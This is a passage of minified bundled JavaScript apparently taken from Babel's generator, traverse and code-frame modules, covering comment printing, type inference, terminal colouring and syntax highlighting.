0:M.start.line)||0,this._printNewline(!0,K)}}}if(Q)this.dedent()}printAndIndentOnComments(X){let J=X.leadingComments&&X.leadingComments.length>0;if(J)this.indent();if(this.print(X),J)this.dedent()}printBlock(X){let J=X.body;if(J.type!=="EmptyStatement")this.space();this.print(J)}_printTrailingComments(X,J,Q){let{innerComments:Y,trailingComments:W}=X;if(Y!=null&&Y.length)this._printComments(2,Y,X,J,Q);if(W!=null&&W.length)this._printComments(2,W,X,J,Q)}_printLeadingComments(X,J){let Q=X.leadingComments;if(!(Q!=null&&Q.length))return;this._printComments(0,Q,X,J)}_maybePrintInnerComments(X,J){if(this._endsWithInnerRaw){var Q;this.printInnerComments((Q=this.tokenMap)==null?void 0:Q.findMatching(this._currentNode,X,J))}this._endsWithInnerRaw=!0,this._indentInnerComments=!0}printInnerComments(X){let J=this._currentNode,Q=J.innerComments;if(!(Q!=null&&Q.length))return;let Y=this.endsWith(32),W=this._indentInnerComments,z=this._printedComments.size;if(W)this.indent();if(this._printComments(1,Q,J,void 0,void 0,X),Y&&z!==this._printedComments.size)this.space();if(W)this.dedent()}noIndentInnerCommentsHere(){this._indentInnerComments=!1}printSequence(X,J,Q,Y){this.printJoin(X,!0,J!=null?J:!1,void 0,void 0,Y,void 0,Q)}printList(X,J,Q,Y,W,z){this.printJoin(X,Q,Y,W!=null?W:HP1,J,void 0,z)}shouldPrintTrailingComma(X){if(!this.tokenMap)return null;let J=this.tokenMap.findLastIndex(this._currentNode,(Q)=>this.tokenMap.matchesOriginal(Q,X));if(J<=0)return null;return this.tokenMap.matchesOriginal(this._tokens[J-1],",")}_printNewline(X,J){let Q=this.format;if(Q.retainLines||Q.compact)return;if(Q.concise){this.space();return}if(!X)return;let Y=J.nextNodeStartLine,W=this._lastCommentLine;if(Y>0&&W>0){let z=Y-W;if(z>=0){this.newline(z||1);return}}if(this._buf.hasContent())this.newline(1)}_shouldPrintComment(X,J){if(X.ignore)return 0;if(this._printedComments.has(X))return 0;if(this._noLineTerminator&&GP1.test(X.value))return 2;if(J&&this.tokenMap){let Q=this.tokenMap.find(this._currentNode,(Y)=>Y.value===X.value);if(Q&&Q.start>J.start)return 2}if(this._printedComments.add(X),!this.format.shouldPrintComment(X.value))return 0;return 1}_printComment(X,J){let Q=this._noLineTerminator,Y=X.type==="CommentBlock",W=Y&&J!==1&&!this._noLineTerminator;if(W&&this._buf.hasContent()&&J!==2)this.newline(1);let z=this.getLastChar();if(z!==91&&z!==123&&z!==40)this.space();let G;if(Y){if(G=`/*${X.value}*/`,this.format.indent.adjustMultilineComment){var H;let U=(H=X.loc)==null?void 0:H.start.column;if(U){let K=new RegExp("\\n\\s{1,"+U+"}","g");G=G.replace(K,`
`)}if(this.format.concise)G=G.replace(/\n(?!$)/g,`
`);else{let K=this.format.retainLines?0:this._buf.getCurrentColumn();if(this._shouldIndent(47)||this.format.retainLines)K+=this._getIndent();G=G.replace(/\n(?!$)/g,`
${" ".repeat(K)}`)}}}else if(!Q)G=`//${X.value}`;else G=`/*${X.value}*/`;if(this._endsWithDiv)this._space();if(this.tokenMap){let{_printSemicolonBeforeNextToken:U,_printSemicolonBeforeNextNode:K}=this;this._printSemicolonBeforeNextToken=-1,this._printSemicolonBeforeNextNode=-1,this.source("start",X.loc),this._append(G,Y),this._printSemicolonBeforeNextNode=K,this._printSemicolonBeforeNextToken=U}else this.source("start",X.loc),this._append(G,Y);if(!Y&&!Q)this.newline(1,!0);if(W&&J!==3)this.newline(1)}_printComments(X,J,Q,Y,W=0,z){let G=Q.loc,H=J.length,U=!!G,K=U?G.start.line:0,V=U?G.end.line:0,B=0,Z=0,M=this._noLineTerminator?function(){}:this.newline.bind(this);for(let F=0;F<H;F++){let j=J[F],O=this._shouldPrintComment(j,z);if(O===2){U=!1;break}if(U&&j.loc&&O===1){let N=j.loc.start.line,A=j.loc.end.line;if(X===0){let D=0;if(F===0){if(this._buf.hasContent()&&(j.type==="CommentLine"||N!==A))D=Z=1}else D=N-B;if(B=A,M(D),this._printComment(j,1),F+1===H)M(Math.max(K-B,Z)),B=K}else if(X===1){let D=N-(F===0?K:B);if(B=A,M(D),this._printComment(j,1),F+1===H)M(Math.min(1,V-B)),B=V}else{let D=N-(F===0?V-W:B);B=A,M(D),this._printComment(j,1)}}else{if(U=!1,O!==1)continue;if(H===1){let N=j.loc?j.loc.start.line===j.loc.end.line:!dj.test(j.value),A=N&&!eC1(Q)&&!XP1(Y)&&!JP1(Y)&&!QP1(Q);if(X===0)this._printComment(j,A&&Q.type!=="ObjectExpression"||N&&tC1(Y,{body:Q})?1:0);else if(A&&X===2)this._printComment(j,1);else this._printComment(j,0)}else if(X===1&&!(Q.type==="ObjectExpression"&&Q.properties.length>1)&&Q.type!=="ClassBody"&&Q.type!=="TSInterfaceBody")this._printComment(j,F===0?2:F===H-1?3:0);else this._printComment(j,0)}}if(X===2&&U&&B)this._lastCommentLine=B}}Object.assign(d4.prototype,aC1);sC1.addDeprecatedGenerators(d4);var G00=ij.default=d4;function HP1(X,J){if(this.token(",",!1,X),!J)this.space()}});var JO=c((ej)=>{Object.defineProperty(ej,"__esModule",{value:!0});ej.default=void 0;ej.generate=tj;var aj=CF(),sj=nj();function oj(X,J,Q){if(J.experimental_preserveFormat){if(typeof X!=="string")throw new Error("`experimental_preserveFormat` requires the original `code` to be passed to @babel/generator as a string");if(!J.retainLines)throw new Error("`experimental_preserveFormat` requires `retainLines` to be set to `true`");if(J.compact&&J.compact!=="auto")throw new Error("`experimental_preserveFormat` is not compatible with the `compact` option");if(J.minified)throw new Error("`experimental_preserveFormat` is not compatible with the `minified` option");if(J.jsescOption)throw new Error("`experimental_preserveFormat` is not compatible with the `jsescOption` option");if(!Array.isArray(Q.tokens))throw new Error("`experimental_preserveFormat` requires the AST to have attached the token of the input code. Make sure to enable the `tokens: true` parser option.")}let Y={auxiliaryCommentBefore:J.auxiliaryCommentBefore,auxiliaryCommentAfter:J.auxiliaryCommentAfter,shouldPrintComment:J.shouldPrintComment,preserveFormat:J.experimental_preserveFormat,retainLines:J.retainLines,retainFunctionParens:J.retainFunctionParens,comments:J.comments==null||J.comments,compact:J.compact,minified:J.minified,concise:J.concise,indent:{adjustMultilineComment:!0,style:"  "},jsescOption:Object.assign({quotes:"double",wrap:!0,minimal:!1},J.jsescOption),topicToken:J.topicToken,importAttributesKeyword:J.importAttributesKeyword};{var W;Y.decoratorsBeforeExport=J.decoratorsBeforeExport,Y.jsescOption.json=J.jsonCompatibleStrings,Y.recordAndTupleSyntaxType=(W=J.recordAndTupleSyntaxType)!=null?W:"hash"}if(Y.minified)Y.compact=!0,Y.shouldPrintComment=Y.shouldPrintComment||(()=>Y.comments);else Y.shouldPrintComment=Y.shouldPrintComment||((U)=>Y.comments||U.includes("@license")||U.includes("@preserve"));if(Y.compact==="auto"){if(Y.compact=typeof X==="string"&&X.length>500000,Y.compact)console.error(`[BABEL] Note: The code generator has deoptimised the styling of ${J.filename} as it exceeds the max of 500KB.`)}if(Y.compact||Y.preserveFormat)Y.indent.adjustMultilineComment=!1;let{auxiliaryCommentBefore:z,auxiliaryCommentAfter:G,shouldPrintComment:H}=Y;if(z&&!H(z))Y.auxiliaryCommentBefore=void 0;if(G&&!H(G))Y.auxiliaryCommentAfter=void 0;return Y}ej.CodeGenerator=class X{constructor(J,Q={},Y){this._ast=void 0,this._format=void 0,this._map=void 0,this._ast=J,this._format=oj(Y,Q,J),this._map=Q.sourceMaps?new aj.default(Q,Y):null}generate(){return new sj.default(this._format,this._map).generate(this._ast)}};function tj(X,J={},Q){let Y=oj(Q,J,X),W=J.sourceMaps?new aj.default(J,Q):null;return new sj.default(Y,W,X.tokens,typeof Q==="string"?Q:null).generate(X)}var H00=ej.default=tj});var YO=c((QO)=>{Object.defineProperty(QO,"__esModule",{value:!0});QO.find=qP1;QO.findParent=BP1;QO.getAncestry=OP1;QO.getDeepestCommonAncestorFrom=jP1;QO.getEarliestCommonAncestorFrom=FP1;QO.getFunctionParent=ZP1;QO.getStatementParent=MP1;QO.inType=NP1;QO.isAncestor=RP1;QO.isDescendant=AP1;var KP1=U0(),{VISITOR_KEYS:VP1}=KP1;function BP1(X){let J=this;while(J=J.parentPath)if(X(J))return J;return null}function qP1(X){let J=this;do if(X(J))return J;while(J=J.parentPath);return null}function ZP1(){return this.findParent((X)=>X.isFunction())}function MP1(){let X=this;do if(!X.parentPath||Array.isArray(X.container)&&X.isStatement())break;else X=X.parentPath;while(X);if(X&&(X.isProgram()||X.isFile()))throw new Error("File/Program node, we can't possibly find a statement parent to this");return X}function FP1(X){return this.getDeepestCommonAncestorFrom(X,function(J,Q,Y){let W,z=VP1[J.type];for(let G of Y){let H=G[Q+1];if(!W){W=H;continue}if(H.listKey&&W.listKey===H.listKey){if(H.key<W.key){W=H;continue}}let U=z.indexOf(W.parentKey),K=z.indexOf(H.parentKey);if(U>K)W=H}return W})}function jP1(X,J){if(!X.length)return this;if(X.length===1)return X[0];let Q=1/0,Y,W,z=X.map((H)=>{let U=[];do U.unshift(H);while((H=H.parentPath)&&H!==this);if(U.length<Q)Q=U.length;return U}),G=z[0];X:for(let H=0;H<Q;H++){let U=G[H];for(let K of z)if(K[H]!==U)break X;Y=H,W=U}if(W)if(J)return J(W,Y,z);else return W;else throw new Error("Couldn't find intersection")}function OP1(){let X=this,J=[];do J.push(X);while(X=X.parentPath);return J}function RP1(X){return X.isDescendant(this)}function AP1(X){return!!this.findParent((J)=>J===X)}function NP1(...X){let J=this;while(J){if(X.includes(J.node.type))return!0;J=J.parentPath}return!1}});var oG=c((zO)=>{Object.defineProperty(zO,"__esModule",{value:!0});zO.createUnionType=xP1;var $P1=U0(),{createFlowUnionType:WO,createTSUnionType:GO,createUnionTypeAnnotation:kP1,isFlowType:bP1,isTSType:vP1}=$P1;function xP1(X){if(X.every((J)=>bP1(J))){if(WO)return WO(X);return kP1(X)}else if(X.every((J)=>vP1(J))){if(GO)return GO(X)}}});var qO=c((BO)=>{Object.defineProperty(BO,"__esModule",{value:!0});BO.default=uP1;var gP1=U0(),UO=oG(),{BOOLEAN_NUMBER_BINARY_OPERATORS:hP1,createTypeAnnotationBasedOnTypeof:yP1,numberTypeAnnotation:KO,voidTypeAnnotation:mP1}=gP1;function uP1(X){if(!this.isReferenced())return;let J=this.scope.getBinding(X.name);if(J)if(J.identifier.typeAnnotation)return J.identifier.typeAnnotation;else return cP1(J,this,X.name);if(X.name==="undefined")return mP1();else if(X.name==="NaN"||X.name==="Infinity")return KO();else if(X.name==="arguments");}function cP1(X,J,Q){let Y=[],W=[],z=HO(X,J,W),G=VO(X,J,Q);if(G){let H=HO(X,G.ifStatement);z=z.filter((U)=>!H.includes(U)),Y.push(G.typeAnnotation)}if(z.length){z.push(...W);for(let H of z)Y.push(H.getTypeAnnotation())}if(!Y.length)return;return UO.createUnionType(Y)}function HO(X,J,Q){let Y=X.constantViolations.slice();return Y.unshift(X.path),Y.filter((W)=>{W=W.resolve();let z=W._guessExecutionStatusRelativeTo(J);if(Q&&z==="unknown")Q.push(W);return z==="before"})}function lP1(X,J){let Q=J.node.operator,Y=J.get("right").resolve(),W=J.get("left").resolve(),z;if(W.isIdentifier({name:X}))z=Y;else if(Y.isIdentifier({name:X}))z=W;if(z){if(Q==="===")return z.getTypeAnnotation();if(hP1.includes(Q))return KO();return}if(Q!=="==="&&Q!=="==")return;let G,H;if(W.isUnaryExpression({operator:"typeof"}))G=W,H=Y;else if(Y.isUnaryExpression({operator:"typeof"}))G=Y,H=W;if(!G)return;if(!G.get("argument").isIdentifier({name:X}))return;if(H=H.resolve(),!H.isLiteral())return;let U=H.node.value;if(typeof U!=="string")return;return yP1(U)}function pP1(X,J,Q){let Y;while(Y=J.parentPath){if(Y.isIfStatement()||Y.isConditionalExpression()){if(J.key==="test")return;return Y}if(Y.isFunction()){if(Y.parentPath.scope.getBinding(Q)!==X)return}J=Y}}function VO(X,J,Q){let Y=pP1(X,J,Q);if(!Y)return;let z=[Y.get("test")],G=[];for(let H=0;H<z.length;H++){let U=z[H];if(U.isLogicalExpression()){if(U.node.operator==="&&")z.push(U.get("left")),z.push(U.get("right"))}else if(U.isBinaryExpression()){let K=lP1(Q,U);if(K)G.push(K)}}if(G.length)return{typeAnnotation:UO.createUnionType(G),ifStatement:Y};return VO(X,Y,Q)}});var NO=c((Xz)=>{Object.defineProperty(Xz,"__esModule",{value:!0});Xz.ArrayExpression=OO;Xz.AssignmentExpression=MS1;Xz.BinaryExpression=KS1;Xz.BooleanLiteral=RS1;Xz.CallExpression=SS1;Xz.ConditionalExpression=BS1;Xz.ClassDeclaration=Xz.ClassExpression=Xz.FunctionDeclaration=Xz.ArrowFunctionExpression=Xz.FunctionExpression=DS1;Object.defineProperty(Xz,"Identifier",{enumerable:!0,get:function(){return rP1.default}});Xz.LogicalExpression=VS1;Xz.NewExpression=zS1;Xz.NullLiteral=AS1;Xz.NumericLiteral=OS1;Xz.ObjectExpression=LS1;Xz.ParenthesizedExpression=ZS1;Xz.RegExpLiteral=NS1;Xz.RestElement=RO;Xz.SequenceExpression=qS1;Xz.StringLiteral=jS1;Xz.TSAsExpression=jO;Xz.TSNonNullExpression=GS1;Xz.TaggedTemplateExpression=TS1;Xz.TemplateLiteral=HS1;Xz.TypeCastExpression=FO;Xz.UnaryExpression=US1;Xz.UpdateExpression=FS1;Xz.VariableDeclarator=WS1;var iP1=U0(),rP1=qO(),MO=oG(),{BOOLEAN_BINARY_OPERATORS:nP1,BOOLEAN_UNARY_OPERATORS:aP1,NUMBER_BINARY_OPERATORS:sP1,NUMBER_UNARY_OPERATORS:oP1,STRING_UNARY_OPERATORS:tP1,anyTypeAnnotation:ZO,arrayTypeAnnotation:tG,booleanTypeAnnotation:eG,buildMatchMemberExpression:i4,genericTypeAnnotation:XX,identifier:mX,nullLiteralTypeAnnotation:eP1,numberTypeAnnotation:sJ,stringTypeAnnotation:uX,tupleTypeAnnotation:XS1,unionTypeAnnotation:JS1,voidTypeAnnotation:QS1,isIdentifier:YS1}=iP1;function WS1(){if(!this.get("id").isIdentifier())return;return this.get("init").getTypeAnnotation()}function FO(X){return X.typeAnnotation}FO.validParent=!0;function jO(X){return X.typeAnnotation}jO.validParent=!0;function GS1(){return this.get("expression").getTypeAnnotation()}function zS1(X){if(X.callee.type==="Identifier")return XX(X.callee)}function HS1(){return uX()}function US1(X){let J=X.operator;if(J==="void")return QS1();else if(oP1.includes(J))return sJ();else if(tP1.includes(J))return uX();else if(aP1.includes(J))return eG()}function KS1(X){let J=X.operator;if(sP1.includes(J))return sJ();else if(nP1.includes(J))return eG();else if(J==="+"){let Q=this.get("right"),Y=this.get("left");if(Y.isBaseType("number")&&Q.isBaseType("number"))return sJ();else if(Y.isBaseType("string")||Q.isBaseType("string"))return uX();return JS1([uX(),sJ()])}}function VS1(){let X=[this.get("left").getTypeAnnotation(),this.get("right").getTypeAnnotation()];return MO.createUnionType(X)}function BS1(){let X=[this.get("consequent").getTypeAnnotation(),this.get("alternate").getTypeAnnotation()];return MO.createUnionType(X)}function qS1(){return this.get("expressions").pop().getTypeAnnotation()}function ZS1(){return this.get("expression").getTypeAnnotation()}function MS1(){return this.get("right").getTypeAnnotation()}function FS1(X){let J=X.operator;if(J==="++"||J==="--")return sJ()}function jS1(){return uX()}function OS1(){return sJ()}function RS1(){return eG()}function AS1(){return eP1()}function NS1(){return XX(mX("RegExp"))}function LS1(){return XX(mX("Object"))}function OO(){return XX(mX("Array"))}function RO(){return OO()}RO.validParent=!0;function DS1(){return XX(mX("Function"))}var wS1=i4("Array.from"),IS1=i4("Object.keys"),CS1=i4("Object.values"),PS1=i4("Object.entries");function SS1(){let{callee:X}=this.node;if(IS1(X))return tG(uX());else if(wS1(X)||CS1(X)||YS1(X,{name:"Array"}))return tG(ZO());else if(PS1(X))return tG(XS1([uX(),ZO()]));return AO(this.get("callee"))}function TS1(){return AO(this.get("tag"))}function AO(X){if(X=X.resolve(),X.isFunction()){let{node:J}=X;if(J.async)if(J.generator)return XX(mX("AsyncIterator"));else return XX(mX("Promise"));else if(J.generator)return XX(mX("Iterator"));else if(X.node.returnType)return X.node.returnType}}});var PO=c((CO)=>{Object.defineProperty(CO,"__esModule",{value:!0});CO._getTypeAnnotation=IO;CO.baseTypeStrictlyMatches=LT1;CO.couldBeBaseType=NT1;CO.getTypeAnnotation=RT1;CO.isBaseType=AT1;CO.isGenericType=DT1;var LO=NO(),XT1=U0(),{anyTypeAnnotation:wO,isAnyTypeAnnotation:r4,isArrayTypeAnnotation:JT1,isBooleanTypeAnnotation:QT1,isEmptyTypeAnnotation:YT1,isFlowBaseAnnotation:WT1,isGenericTypeAnnotation:GT1,isIdentifier:DO,isMixedTypeAnnotation:zT1,isNumberTypeAnnotation:HT1,isStringTypeAnnotation:UT1,isTSArrayType:KT1,isTSTypeAnnotation:VT1,isTSTypeReference:BT1,isTupleTypeAnnotation:qT1,isTypeAnnotation:ZT1,isUnionTypeAnnotation:MT1,isVoidTypeAnnotation:FT1,stringTypeAnnotation:jT1,voidTypeAnnotation:OT1}=XT1;function RT1(){let X=this.getData("typeAnnotation");if(X!=null)return X;if(X=IO.call(this)||wO(),ZT1(X)||VT1(X))X=X.typeAnnotation;return this.setData("typeAnnotation",X),X}var Jz=new WeakSet;function IO(){let X=this.node;if(!X)if(this.key==="init"&&this.parentPath.isVariableDeclarator()){let Q=this.parentPath.parentPath,Y=Q.parentPath;if(Q.key==="left"&&Y.isForInStatement())return jT1();if(Q.key==="left"&&Y.isForOfStatement())return wO();return OT1()}else return;if(X.typeAnnotation)return X.typeAnnotation;if(Jz.has(X))return;Jz.add(X);try{var J;let Q=LO[X.type];if(Q)return Q.call(this,X);if(Q=LO[this.parentPath.type],(J=Q)!=null&&J.validParent)return this.parentPath.getTypeAnnotation()}finally{Jz.delete(X)}}function AT1(X,J){return Qz(X,this.getTypeAnnotation(),J)}function Qz(X,J,Q){if(X==="string")return UT1(J);else if(X==="number")return HT1(J);else if(X==="boolean")return QT1(J);else if(X==="any")return r4(J);else if(X==="mixed")return zT1(J);else if(X==="empty")return YT1(J);else if(X==="void")return FT1(J);else if(Q)return!1;else throw new Error(`Unknown base type ${X}`)}function NT1(X){let J=this.getTypeAnnotation();if(r4(J))return!0;if(MT1(J)){for(let Q of J.types)if(r4(Q)||Qz(X,Q,!0))return!0;return!1}else return Qz(X,J,!0)}function LT1(X){let J=this.getTypeAnnotation(),Q=X.getTypeAnnotation();if(!r4(J)&&WT1(J))return Q.type===J.type;return!1}function DT1(X){let J=this.getTypeAnnotation();if(X==="Array"){if(KT1(J)||JT1(J)||qT1(J))return!0}return GT1(J)&&DO(J.id,{name:X})||BT1(J)&&DO(J.typeName,{name:X})}});var _O=c((A00,Yz)=>{var a4=process||{},SO=a4.argv||[],n4=a4.env||{},_T1=!(!!n4.NO_COLOR||SO.includes("--no-color"))&&(!!n4.FORCE_COLOR||SO.includes("--color")||a4.platform==="win32"||(a4.stdout||{}).isTTY&&n4.TERM!=="dumb"||!!n4.CI),ET1=(X,J,Q=X)=>(Y)=>{let W=""+Y,z=W.indexOf(J,X.length);return~z?X+$T1(W,J,Q,z)+J:X+W+J},$T1=(X,J,Q,Y)=>{let W="",z=0;do W+=X.substring(z,Y)+Q,z=Y+J.length,Y=X.indexOf(J,z);while(~Y);return W+X.substring(z)},TO=(X=_T1)=>{let J=X?ET1:()=>String;return{isColorSupported:X,reset:J("\x1B[0m","\x1B[0m"),bold:J("\x1B[1m","\x1B[22m","\x1B[22m\x1B[1m"),dim:J("\x1B[2m","\x1B[22m","\x1B[22m\x1B[2m"),italic:J("\x1B[3m","\x1B[23m"),underline:J("\x1B[4m","\x1B[24m"),inverse:J("\x1B[7m","\x1B[27m"),hidden:J("\x1B[8m","\x1B[28m"),strikethrough:J("\x1B[9m","\x1B[29m"),black:J("\x1B[30m","\x1B[39m"),red:J("\x1B[31m","\x1B[39m"),green:J("\x1B[32m","\x1B[39m"),yellow:J("\x1B[33m","\x1B[39m"),blue:J("\x1B[34m","\x1B[39m"),magenta:J("\x1B[35m","\x1B[39m"),cyan:J("\x1B[36m","\x1B[39m"),white:J("\x1B[37m","\x1B[39m"),gray:J("\x1B[90m","\x1B[39m"),bgBlack:J("\x1B[40m","\x1B[49m"),bgRed:J("\x1B[41m","\x1B[49m"),bgGreen:J("\x1B[42m","\x1B[49m"),bgYellow:J("\x1B[43m","\x1B[49m"),bgBlue:J("\x1B[44m","\x1B[49m"),bgMagenta:J("\x1B[45m","\x1B[49m"),bgCyan:J("\x1B[46m","\x1B[49m"),bgWhite:J("\x1B[47m","\x1B[49m"),blackBright:J("\x1B[90m","\x1B[39m"),redBright:J("\x1B[91m","\x1B[39m"),greenBright:J("\x1B[92m","\x1B[39m"),yellowBright:J("\x1B[93m","\x1B[39m"),blueBright:J("\x1B[94m","\x1B[39m"),magentaBright:J("\x1B[95m","\x1B[39m"),cyanBright:J("\x1B[96m","\x1B[39m"),whiteBright:J("\x1B[97m","\x1B[39m"),bgBlackBright:J("\x1B[100m","\x1B[49m"),bgRedBright:J("\x1B[101m","\x1B[49m"),bgGreenBright:J("\x1B[102m","\x1B[49m"),bgYellowBright:J("\x1B[103m","\x1B[49m"),bgBlueBright:J("\x1B[104m","\x1B[49m"),bgMagentaBright:J("\x1B[105m","\x1B[49m"),bgCyanBright:J("\x1B[106m","\x1B[49m"),bgWhiteBright:J("\x1B[107m","\x1B[49m")}};Yz.exports=TO();Yz.exports.createColors=TO});var $O=c((EO)=>{Object.defineProperty(EO,"__esModule",{value:!0});EO.default=/((['"])(?:(?!\2|\\).|\\(?:\r\n|[\s\S]))*(\2)?|`(?:[^`\\$]|\\[\s\S]|\$(?!\{)|\$\{(?:[^{}]|\{[^}]*\}?)*\}?)*(`)?)|(\/\/.*)|(\/\*(?:[^*]|\*(?!\/))*(\*\/)?)|(\/(?!\*)(?:\[(?:(?![\]\\]).|\\.)*\]|(?![\/\]\\]).|\\.)+\/(?:(?!\s*(?:\b|[\u0080-\uFFFF$\\'"~({]|[+\-!](?!=)|\.?\d))|[gmiyus]{1,6}\b(?![\u0080-\uFFFF$\\]|\s*(?:[+\-*%&|^<>!=?({]|\/(?![\/*])))))|(0[xX][\da-fA-F]+|0[oO][0-7]+|0[bB][01]+|(?:\d*\.\d+|\d+\.?)(?:[eE][+-]?\d+)?)|((?!\d)(?:(?!\s)[$\w\u0080-\uFFFF]|\\u[\da-fA-F]{4}|\\u\{[\da-fA-F]+\})+)|(--|\+\+|&&|\|\||=>|\.{3}|(?:[+\-\/%&|^]|\*{1,2}|<{1,2}|>{1,3}|!=?|={1,2})=?|[?~.,:;[\](){}])|(\s+)|(^$|[\s\S])/g;EO.matchToToken=function(X){var J={type:"invalid",value:X[0],closed:void 0};if(X[1])J.type="string",J.closed=!!(X[3]||X[4]);else if(X[5])J.type="comment";else if(X[6])J.type="comment",J.closed=!!X[7];else if(X[8])J.type="regex";else if(X[9])J.type="number";else if(X[10])J.type="name";else if(X[11])J.type="punctuator";else if(X[12])J.type="whitespace";return J}});var Gz=c((uO)=>{Object.defineProperty(uO,"__esModule",{value:!0});var Wz=_O(),kO=$O(),bO=C5();function vT1(){return typeof process==="object"&&(process.env.FORCE_COLOR==="0"||process.env.FORCE_COLOR==="false")?!1:Wz.isColorSupported}var s4=(X,J)=>(Q)=>X(J(Q));function fO(X){return{keyword:X.cyan,capitalized:X.yellow,jsxIdentifier:X.yellow,punctuator:X.yellow,number:X.magenta,string:X.green,regex:X.magenta,comment:X.gray,invalid:s4(s4(X.white,X.bgRed),X.bold),gutter:X.gray,marker:s4(X.red,X.bold),message:s4(X.red,X.bold),reset:X.reset}}var xT1=fO(Wz.createColors(!0)),fT1=fO(Wz.createColors(!1));function gO(X){return X?xT1:fT1}var gT1=new Set(["as","async","from","get","of","set"]),hT1=/\r\n|[\n\r\u2028\u2029]/,yT1=/^[()[\]{}]$/,hO;{let X=/^[a-z][\w-]*$/i,J=function(Q,Y,W){if(Q.type==="name"){if(bO.isKeyword(Q.value)||bO.isStrictReservedWord(Q.value,!0)||gT1.has(Q.value))return"keyword";if(X.test(Q.value)&&(W[Y-1]==="<"||W.slice(Y-2,Y)==="</"))return"jsxIdentifier";if(Q.value[0]!==Q.value[0].toLowerCase())return"capitalized"}if(Q.type==="punctuator"&&yT1.test(Q.value))return"bracket";if(Q.type==="invalid"&&(Q.value==="@"||Q.value==="#"))return"punctuator";return Q.type};hO=function*(Q){let Y;while(Y=kO.default.exec(Q)){let W=kO.matchToToken(Y);yield{type:J(W,Y.index,Q),value:W.value}}}}function yO(X){if(X==="")return"";let J=gO(!0),Q="";for(let{type:Y,value:W}of hO(X))if(Y in J)Q+=W.split(hT1).map((z)=>J[Y](z)).join(`
`);else Q+=W;return Q}var vO=!1,xO=/\r\n|[\n\r\u2028\u2029]/;function mT1(X,J,Q){let Y=Object.assign({column:0,line:-1},X.start),W=Object.assign({},Y,X.end),{linesAbove:z=2,linesBelow:G=3}=Q||{},H=Y.line,U=Y.column,K=W.line,V=W.column,B=Math.max(H-(z+1),0),Z=Math.min(J.length,K+G);if(H===-1)B=0;if(K===-1)Z=J.length;let M=K-H,F={};if(M)for(let j=0;j<=M;j++){let O=j+H;if(!U)F[O]=!0;else if(j===0){let N=J[O-1].length;F[O]=[U,N-U+1]}else if(j===M)F[O]=[0,V];else{let N=J[O-j].length;F[O]=[0,N]}}else if(U===V)if(U)F[H]=[U,0];else F[H]=!0;else F[H]=[U,V-U];return{start:B,end:Z,markerLines:F}}function mO(X,J,Q={}){let Y=Q.forceColor||vT1()&&Q.highlightCode,W=gO(Y),z=X.split(xO),{start:G,end:H,markerLines:U}=mT1(J,z,Q),K=J.start&&typeof J.start.column==="number",V=String(H).length,Z=(Y?yO(X):X).split(xO,H).slice(G,H).map((M,F)=>{let j=G+1+F,N=` ${` ${j}`.slice(-V)} |`,A=U[j],D=!U[j+1];if(A){let S="";if(Array.isArray(A)){let $=M.slice(0,Math.max(A[0]-1,0)).replace(/[^\t]/g," "),T=A[1]||1;if(S=[`
 `,W.gutter(N.replace(/\d/g," "))," ",$,W.marker("^").repeat(T)].join(""),D&&Q.message)S+=" "+W.message(Q.message)}return[W.marker(">"),W.gutter(N),M.length>0?` ${M}`:"",S].join("")}else return` ${W.gutter(N)}${M.length>0?` ${M}`:""}`}).join(`
`);if(Q.message&&!K)Z=`${" ".repeat(V+1)}${Q.message}
${Z}`;if(Y)return W.reset(Z);else return Z}function uT1(X,J,Q,Y={}){if(!vO){vO=!0;let z="Passing lineNumber and colNumber is deprecated to @babel/code-frame. Please use `codeFrameColumns`.";if(process.emitWarning)process.emitWarning(z,"DeprecationWarning");else{let G=new Error(z);G.name="DeprecationWarning",console.warn(new Error(z))}}return Q=Math.max(Q,0),mO(X,{start:{column:Q,line:J}},Y)}uO.codeFrameColumns=mO;uO.default=uT1;uO.highlight=yO});var pO=c((cO)=>{Object.defineProperty(cO,"__esModule",{value:!0});cO.hooks=void 0;var D00=cO.hooks=[function(X,J){if(X.key==="test"&&(J.isWhile()||J.isSwitchCase())||X.key==="declaration"&&J.isExportDeclaration()||X.key==="body"&&J.isLabeledStatement()||X.listKey==="declarations"&&J.isVariableDeclaration()&&J.node.declarations.length===1||X.key==="expression"&&J.isExpressionStatement())return J.remove(),!0},function(X,J){if(J.isSequenceExpression()&&J.node.expressions.length===1)return J.replaceWith(J.node.expressions[0]),!0},function(X,J){if(J.isBinary()){if(X.key==="left")J.replaceWith(J.node.right);else J.replaceWith(J.node.left);return!0}},function(X,J){if(J.isIfStatement()&&X.key==="consequent"||X.key==="body"&&(J.isLoop()||J.isArrowFunctionExpression()))return X.replaceWith({type:"BlockStatement",body:[]}),!0}]});var o4=c((sO)=>{Object.defineProperty(sO,"__esModule",{value:!0});sO._assertUnremoved=aO;sO._callRemovalHooks=rO;sO._markRemoved=zz;sO._remove=nO;sO._removeFromScope=iO;sO.remove=tT1;var dT1=pO(),iT1=xX(),rT1=Hz(),dO=I6(),nT1=U0(),aT1=t4(),sT1=P8(),{getBindingIdentifiers:oT1}=nT1;function tT1(){var X;if(aO.call(this),sT1.resync.call(this),rO.call(this)){zz.call(this);return}if(!((X=this.opts)!=null&&X.noScope))iO.call(this);this.shareCommentsWithSiblings(),nO.call(this),zz.call(this)}function iO(){let X=oT1(this.node,!1,!1,!0);Object.keys(X).forEach((J)=>this.scope.removeBinding(J))}function rO(){if(this.parentPath){for(let X of dT1.hooks)if(X(this,this.parentPath))return!0}}function nO(){if(Array.isArray(this.container))this.container.splice(this.key,1),aT1.updateSiblingKeys.call(this,this.key,-1);else rT1._replaceWith.call(this,null)}function zz(){if(this._traverseFlags|=dO.SHOULD_SKIP|dO.REMOVED,this.parent){var X;(X=iT1.getCachedPaths(this))==null||X.delete(this.node)}this.node=null}function aO(){if(this.removed)throw this.buildCodeFrameError("NodePath has been removed so is read-only.")}});var JR=c((eO)=>{Object.defineProperty(eO,"__esModule",{value:!0});eO.default=void 0;var oO=U0(),G_1=oO,{react:z_1}=oO,{cloneNode:H_1,jsxExpressionContainer:U_1,variableDeclaration:K_1,variableDeclarator:V_1}=G_1,B_1={ReferencedIdentifier(X,J){if(X.isJSXIdentifier()&&z_1.isCompatTag(X.node.name)&&!X.parentPath.isJSXMemberExpression())return;if(X.node.name==="this"){let Y=X.scope;do if(Y.path.isFunction()&&!Y.path.isArrowFunctionExpression())break;while(Y=Y.parent);if(Y)J.breakOnScopePaths.push(Y.path)}let Q=X.scope.getBinding(X.node.name);if(!Q)return;for(let Y of 